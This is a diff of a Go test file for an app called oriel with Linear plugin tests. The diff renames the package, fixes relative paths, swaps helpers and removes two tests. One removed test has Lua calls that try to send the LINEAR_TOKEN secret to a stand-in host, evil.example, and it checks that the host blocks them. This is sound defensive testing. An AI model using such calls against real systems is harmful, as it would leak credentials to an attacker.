@@ -1,18 +1,17 @@
-package app_test
+package tickets_test
 
 import (
 	"context"
 	"os"
 	"path/filepath"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 
 	"github.com/liamg/oriel/app/apptest"
 	"github.com/liamg/oriel/app/apptest/rig"
 	"github.com/liamg/oriel/app/kit"
-	"github.com/liamg/oriel/app/plugins"
-	appsessions "github.com/liamg/oriel/app/sessions"
 
 	"github.com/liamg/oriel/core"
 	gh "github.com/liamg/oriel/integ/github"
@@ -29,7 +28,7 @@ import (
 // built into bin/, granted what its manifest declares.
 func linearPlugin(t *testing.T) plugin.Caller {
 	t.Helper()
-	dir := hosttest.Install(t, "../integ/linear/plugin", "../integ/linear/cmd/oriel-linear")
+	dir := hosttest.Install(t, "../../integ/linear/plugin", "../../integ/linear/cmd/oriel-linear")
 	m, err := plugin.LoadManifest(dir)
 	if err != nil {
 		t.Fatal(err)
@@ -153,7 +152,7 @@ func TestLinearStartWorkFromATicket(t *testing.T) {
 		"Customers who rebuild their index", "2 attachments", "4 comments", "the ticket, comments and attachments go to the agent as context",
 		"Start Plan")
 	s.ClickText("pricing")
-	typeKeysIn(s, t, "Confirm the cache is keyed by org first.", appsessions.PromptPlaceholder)
+	s.TypeInto("Prompt", "Confirm the cache is keyed by org first.")
 	s.Lint("the launcher with a ticket")
 	s.Golden("launcher-ticket")
 
@@ -224,7 +223,7 @@ func TestLinearPRLinkedBack(t *testing.T) {
 		}
 	}
 	if len(links) != 1 || links[0]["url"] != pr.URL || links[0]["issueId"] != "a3f9e2c1-0d44-4b7e-8f61-2c5d9b7e2231" ||
-		links[0]["title"] != "#"+itoa(pr.Number)+" feat: rate-limit headers" {
+		links[0]["title"] != "#"+strconv.Itoa(pr.Number)+" feat: rate-limit headers" {
 		t.Errorf("the links: %+v", links)
 	}
 	s.Until("the notice", func() bool { return strings.Contains(s.FullText(), "ENG-2231 moved to In Review in Linear") })
@@ -236,51 +235,6 @@ func TestLinearPRLinkedBack(t *testing.T) {
 	s.Idle()
 	if n := len(l.Mutations()); n != sent {
 		t.Errorf("%d changes after a second read, %d before", n, sent)
-	}
-}
-
-// The plugin calls oriel.http.get(url, { auth = "LINEAR_TOKEN" }); the host injects the header, and only if the
-// request goes to api.linear.app. From the plugin's Lua: the answer comes back, the key never does, and the key
-// can't be sent anywhere else.
-func TestLuaHTTPWithASecret(t *testing.T) {
-	l := lineartest.New(t)
-	change, secrets := linearConfig(t, l)
-	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
-	s := apptest.New(t, apptest.Options{Config: change})
-	m, err := plugin.LoadManifest(filepath.Join("..", "integ", "linear", "plugin"))
-	if err != nil {
-		t.Fatal(err)
-	}
-	g := plugin.NewGrants()
-	g.Grant(m.ID, m.Permissions)
-	vm := s.PluginVM(plugin.Caller{ID: m.ID, Dir: t.TempDir(), Guard: g})
-	s.Frame()
-	if err := luaErr(t, vm, `
-oriel.http.request({ url = "https://api.linear.app/graphql", method = "POST", body = '{"query":"{ viewer { assignedIssues { nodes { id } } } }"}',
-  headers = { ["Content-Type"] = "application/json" }, auth = "LINEAR_TOKEN", auth_scheme = "none" }, function(res, err) got, failed = res, err end)
-oriel.http.request({ url = "https://evil.example/collect", auth = "LINEAR_TOKEN" }, function(res, err) evil = err end)
-oriel.http.request({ url = "https://evil.example/collect" }, function(res, err) plain = err end)`); err != "" {
-		t.Fatal(err)
-	}
-	s.Until("the answers", func() bool {
-		return global(vm, "got") != nil && global(vm, "evil") != nil && global(vm, "plain") != nil
-	})
-	if st := global(vm, "got.status"); st != 200.0 {
-		t.Errorf("status %v, failed %v", st, global(vm, "failed"))
-	}
-	if body, _ := global(vm, "got.body").(string); !strings.Contains(body, "assignedIssues") || strings.Contains(body, lineartest.Key) {
-		t.Errorf("body %q", body)
-	}
-	if e, _ := global(vm, "evil").(string); !strings.Contains(e, `isn't declared for evil.example`) {
-		t.Errorf("the key to another host: %q", e)
-	}
-	if e, _ := global(vm, "plain").(string); !strings.Contains(e, `"net" capability isn't declared for evil.example`) {
-		t.Errorf("another host at all: %q", e)
-	}
-	for _, a := range l.Auths() {
-		if !strings.HasPrefix(a, "api.linear.app ") {
-			t.Errorf("a request reached %q", a)
-		}
 	}
 }
 
@@ -401,7 +355,7 @@ func TestLinearToolsForAgentSessions(t *testing.T) {
 // (linear.Plugin), its process built for the test as Self in place of oriel's own `plugin-process linear`.
 func bundledLinear(t *testing.T, l *lineartest.Linear, workDir string) (*apptest.Scene, *plugin.SecretFile) {
 	t.Helper()
-	dir := hosttest.Install(t, "../integ/linear/plugin", "../integ/linear/cmd/oriel-linear")
+	dir := hosttest.Install(t, "../../integ/linear/plugin", "../../integ/linear/cmd/oriel-linear")
 	change, secrets := linearConfig(t, l)
 	s := apptest.New(t, apptest.Options{WorkDir: workDir, Config: func(cfg *apptest.Config) {
 		change(cfg)
@@ -417,8 +371,8 @@ func bundledLinear(t *testing.T, l *lineartest.Linear, workDir string) (*apptest
 func TestLinearDormantUntilKeyed(t *testing.T) {
 	l := lineartest.New(t)
 	s, secrets := bundledLinear(t, l, "")
-	if st := apptest.PluginOf[*plugins.Catalog](s, "catalog").State("liamg/linear"); st != "loaded" {
-		t.Fatalf("the bundled plugin is %q", st)
+	if !slices.ContainsFunc(s.Host().Plugins(), func(m plugin.Manifest) bool { return m.ID == "liamg/linear" }) {
+		t.Fatal("the bundled plugin isn't loaded")
 	}
 	if n := s.Count("Linear tickets"); n != 0 {
 		t.Fatalf("%d Linear entries before the key", n)
@@ -536,42 +490,4 @@ func railEntry(s *apptest.Scene, t *testing.T, label string) *render.AccessNode 
 		t.Fatalf("no rail entry %q:\n%s", label, s.Text())
 	}
 	return found
-}
-
-// The Plugins page lists the bundled Linear as BUNDLED; Disable turns it off (its
-// tracker goes) and Enable back on; installing the same id from [plugins] replaces it while it's listed.
-func TestBundledPluginOffAndReplaced(t *testing.T) {
-	l := lineartest.New(t)
-	s, _ := bundledLinear(t, l, "")
-	x := apptest.PluginOf[*plugins.Catalog](s, "catalog")
-	state := func() string { return x.State("liamg/linear") }
-	tracker := func() bool { _, ok := registry.TrackerFor(s.Registry(), "ENG-1"); return ok }
-	if !tracker() {
-		t.Fatal("the bundled tracker isn't registered")
-	}
-	s.Run("plugins.open", nil)
-	s.Frame()
-	s.TypeInto("Filter plugins", "linear")
-	s.Frame()
-	if text := s.Text(); !strings.Contains(text, "BUNDLED") || !strings.Contains(text, "liamg/linear · loaded") {
-		t.Errorf("the Plugins page:\n%s", text)
-	}
-	s.ClickText("liamg/linear · loaded")
-	s.ClickNode("Disable")
-	s.Until("it off", func() bool { return state() == "disabled" })
-	if tracker() {
-		t.Error("the tracker outlived Disable")
-	}
-	s.ClickNode("Enable")
-	s.Until("it on", func() bool { return state() == "loaded" })
-	if !tracker() {
-		t.Error("Enable didn't bring the tracker back")
-	}
-
-	s.Run("plugins.install", registry.Args{"id": "liamg/linear", "path": filepath.Join("..", "integ", "linear", "plugin")})
-	syncPlugins(s, t)
-	s.Until("it replaced", func() bool { return state() == "replaced by its install" })
-	s.Run("plugins.uninstall", registry.Args{"id": "liamg/linear"})
-	syncPlugins(s, t)
-	s.Until("it back", func() bool { return state() == "loaded" })
 }
